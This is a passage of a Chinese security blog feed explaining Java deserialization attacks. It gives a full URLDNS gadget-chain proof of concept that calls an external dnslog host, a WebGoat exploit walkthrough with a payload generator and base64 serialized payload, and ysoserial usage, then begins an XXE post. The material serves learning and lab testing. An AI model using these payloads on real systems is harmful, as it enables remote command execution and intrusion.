class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个函数，一个<code>putVal</code>，一个是<code>hash</code>，现在进去<code>putVal</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class="line">                   boolean evict) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class="line">        if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">....</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没啥，涉及到的函数都是与树相关的操作，就是存储吧，所以返回<code>hash</code>方法，这个方法传入的是<code>key</code>的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key是URL的，所以去到URL类看看<code>hashCode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要<code>hashCode==-1</code>才能执行后面的<code>hashCode</code>函数，跟进<code>hashcode</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现<code>InetAddress addr = getHostAddress(u)</code>可以获取URL的IP地址就是域名解析。</p><p>我其实跑偏了：正确是先找<code>readObject</code>。</p><p>当我们传入序列化的数据时，因为<code>HashMap</code>有<code>readObject</code>函数，所以跟进一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">.......</span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现<code>putVal(hash(key), key, value, false, false);</code>这个，上面已经分析过。所以</p><p>所以利用链就是：</p><blockquote><ol><li>存在<code>URL</code>和<code>Hashmap</code></li><li><code>Hashmap</code>重写了<code>readObject</code>方法，里面，使用<code>putVal</code>函数的时候会调用<code>hash</code>函数对URL进行<code>hashCode</code>处理</li><li><code>URL</code>的<code>hashcode</code>函数调用<code>getHostAddress</code>进行域名解析</li></ol></blockquote><p>所以现在模仿写一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.urldns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">/* ERROR</span></span><br><span class="line"><span class="comment">        1. Unable to make field private int java.net.URL.hashCode accessible: module java.base does not &quot;opens</span></span><br><span class="line"><span class="comment">        -- Java version is too high</span></span><br><span class="line"><span class="comment">        2. has been compiled by a more recent version of the Java Runtime (class file version 52.0)</span></span><br><span class="line"><span class="comment">        -- Java version is too high. Please reset the project structure and the configuration</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sUrl</span> <span class="operator">=</span> <span class="string">&quot;http://ib7pmo.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">uUrl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(sUrl);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 这里获取URL类的字段，这里列举两种方法</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">// Field field = uUrl.getClass().getDeclaredField(&quot;hashCode&quot;);</span></span><br><span class="line">        <span class="comment">// 因为是私有方法，所以这里设置能更改</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 为了不混淆，这里put方法也可以造成dnslog的，所以设置2</span></span><br><span class="line">        field.set(uUrl, <span class="number">2</span>);</span><br><span class="line">        hashMap.put(uUrl, <span class="string">&quot;J3ff&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 存起来了，后面就可以用了</span></span><br><span class="line">        field.set(uUrl, -<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 开始序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.exp&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns.exp&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="webgoat-反序列化漏洞分析-and-ysoserial的使用"><a class="markdownIt-Anchor" href="#webgoat-反序列化漏洞分析-and-ysoserial的使用"></a> webgoat 反序列化漏洞分析 and ysoserial的使用</h3><p>现在查到这个有漏洞的类代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDeserializationTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InsecureDeserializationTask</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/InsecureDeserialization/task&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String token)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 对接收到的token进行了一波敏感字符替换变成b64token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64token</span> <span class="operator">=</span> token.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">long</span> before;<span class="type">long</span> after;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            label71: &#123;</span><br><span class="line">                <span class="comment">// 对b64token解码过后进行了readObject()反序列化操作（第16行）</span></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(b64token)));</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                            before = System.currentTimeMillis();</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                <span class="comment">// 看这个对象是不是VulnerableTaskHolder的实例</span></span><br><span class="line">                <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> VulnerableTaskHolder)) &#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                            after = System.currentTimeMillis();</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 看执行了多久，时间长了就算成功</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">delay</span> <span class="operator">=</span> (<span class="type">int</span>)(after - before); <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>就如上面代码所示，我们应该看VulnerableTaskHolder类，里面的readObject()反序列化操作到底有什么可以利用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String taskName;</span><br><span class="line">  <span class="keyword">private</span> String taskAction;</span><br><span class="line">  <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">    <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">    <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;VulnerableTaskHolder [taskName=&quot;</span> + taskName + <span class="string">&quot;, taskAction=&quot;</span> + taskAction + <span class="string">&quot;, requestedExecutionTime=&quot;</span> + requestedExecutionTime + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 执行反序列化操作</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 反序列化中的taskName和taskAction属性都是可以利用的</span></span><br><span class="line">    stream.defaultReadObject();</span><br><span class="line">    <span class="comment">// 对数据进行操作的记录 ...</span></span><br><span class="line"><span class="comment">// 对象误操作 ...</span></span><br><span class="line">    <span class="comment">// 注释：这里的条件是为了防止你把山羊完全毁掉</span></span><br><span class="line">    <span class="keyword">if</span> ((taskAction.startsWith(<span class="string">&quot;sleep&quot;</span>) || taskAction.startsWith(<span class="string">&quot;ping&quot;</span>)) &amp;&amp; taskAction.length() &lt; <span class="number">22</span>) &#123;</span><br><span class="line">      log.info(<span class="string">&quot;about to execute: &#123;&#125;&quot;</span>, taskAction);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// 执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(taskAction);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">          log.info(line);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;IO Exception&quot;</span>, e);</span><br><span class="line">&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中，所以构造payload的java文件（目录为src文件夹中，org.dummy.insecure.framework文件夹下的Main文件）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">VulnerableTaskHolder</span> <span class="variable">vulnerableTaskHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;ping -n 6 127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(vulnerableTaskHolder);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把VulnerableTaskHolder.java也弄到这里去：目录为src文件夹中，org.dummy.insecure.framework文件夹下，注意删掉错误的部分。运行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfnBgYRFBgzn0lIeHQAE3BpbmcgLW4gNiAxMjcuMC4wLjF0AARwaW5n</span><br></pre></td></tr></table></figure><p>所以我们要构造的恶意代码应该遵循：<strong>恶意命令→序列化→base64→rO0AB格式字符串【最终Payload】</strong></p><p>当然，我们可以使用DNSlog测试：<code>VulnerableTaskHolder vuln = new VulnerableTaskHolder(&quot;qwq&quot;,&quot;ping ***.dnslog.cn&quot;);</code></p><blockquote><p>这个恶意命令一般是反弹shell，因为考虑到有的不回显。</p></blockquote><h4 id="ysoserial"><a class="markdownIt-Anchor" href="#ysoserial"></a> ysoserial</h4><p>可以看到里面有很多组件，选择其中的一个，然后通过他给出的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: java -jar ysoserial-[version]-all.jar [payload] &#x27;[command]&#x27;</span><br></pre></td></tr></table></figure><p>我们找到需要的组件，然后生成即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\ysoserial.jar Hibernate1 calc.exe &gt; payload.bin</span><br></pre></td></tr></table></figure><h1 id="php反序列化"><a class="markdownIt-Anchor" href="#php反序列化"></a> PHP反序列化</h1><p>PHP反序列化不是本章的重点，所以浅浅说一下，这里面的序列化结构如下：</p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/1685949580662.png" alt="1685949580662" style="zoom:67%;" /><p>具体可以参考如下导图做简单的复习：</p><p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP反序列化" /></p><p>参考：</p><ol><li><a href="https://xz.aliyun.com/t/12507#toc-11">https://xz.aliyun.com/t/12507#toc-11</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java反序列化&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#java反序列化&quot;&gt;&lt;/a&gt; JAVA反序列化&lt;/h1&gt;
&lt;h2 id=&quot;概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念&quot;&gt;&lt;/a&gt; </summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="反序列化" scheme="https://j3f5.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DNSlog数据外带在各种攻击的利用方式（无回显）</title>
    <link href="https://j3f5.github.io/articles/2023/06/06/DNSlog%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6%E5%9C%A8%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89/"/>
    <id>https://j3f5.github.io/articles/2023/06/06/DNSlog%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6%E5%9C%A8%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89/</id>
    <published>2023-06-06T02:09:43.000Z</published>
    <updated>2023-06-06T02:09:43.000Z</updated>
    
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="XSS" scheme="https://j3f5.github.io/tags/XSS/"/>
    
    <category term="RCE" scheme="https://j3f5.github.io/tags/RCE/"/>
    
    <category term="XXE" scheme="https://j3f5.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>XXE与XML的利用与绕过</title>
    <link href="https://j3f5.github.io/articles/2023/06/05/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <id>https://j3f5.github.io/articles/2023/06/05/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/</id>
    <published>2023-06-05T13:48:11.000Z</published>
    <updated>2023-06-05T13:48:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/XXE%E4%B8%8EXML.png" alt="XXE与XML" /></p><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="xml"><a class="markdownIt-Anchor" href="#xml"></a> XML</h2><p>XML 被设计为传输和存储数据，XML 文档结构包括</p><ol><li>XML 声明</li><li>DTD 文档类型定义（可选）</li><li>文档元素</li></ol><p>其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。</p><h2 id="xxe"><a class="markdownIt-Anchor" href="#xxe"></a> XXE</h2><p>XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可<strong>加载恶意外部文件</strong>，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h2 id="xml-与-html-的主要差异"><a class="markdownIt-Anchor" href="#xml-与-html-的主要差异"></a> XML 与 HTML 的主要差异</h2><ul><li><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p></li><li><p>HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息 ，而 XML 旨在传输信息。</p></li></ul><h2 id="xml文档格式"><a class="markdownIt-Anchor" href="#xml文档格式"></a> XML文档格式</h2><p>其中DOCTYPE是DTD的声明；ENTITY是DDT实体的声明，所谓实体可以理解为变量。SYSTEM、PUBLIC是外部资源的申请。看到SYSTEM后面的文件是可以指向文件的，如果可以被我们控制，那么我们就可以读取服务器文件信息，或者<strong>远程文件</strong>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML 声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [ &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span> &lt;!--定义 note 元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!--定义 to 元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!-- 定义 from 元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!-- 定义 head 元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!-- 定义 body 元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span>&gt;</span> 